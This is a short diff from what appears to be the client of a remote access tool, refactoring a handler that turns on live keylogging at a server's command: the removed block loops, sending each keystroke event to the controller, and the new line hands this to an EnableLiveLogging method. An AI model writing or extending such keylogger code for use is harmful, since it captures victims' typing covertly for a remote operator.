@@ -220,19 +220,8 @@ namespace xClient.Core.Commands
 
         public static void HandleGetKeyloggerLiveResponse(Packets.ServerPackets.GetKeyloggerLive command, Client client)
         {
-            new Thread(() =>
-            {
-                if (Keylogger.Instance != null)
-                {
-                    Keylogger.Instance.LiveModeEnabled = command.Enable;
-
-                    while (Keylogger.Instance.LiveModeEnabled)
-                    {
-                        Keylogger.Instance.SendKeyEvent(client);
-                        Thread.Sleep(10);
-                    }
-                }
-            }).Start();
+            if (Keylogger.Instance != null)
+                Keylogger.Instance.EnableLiveLogging(command.Enable, client);
         }
     }
 }
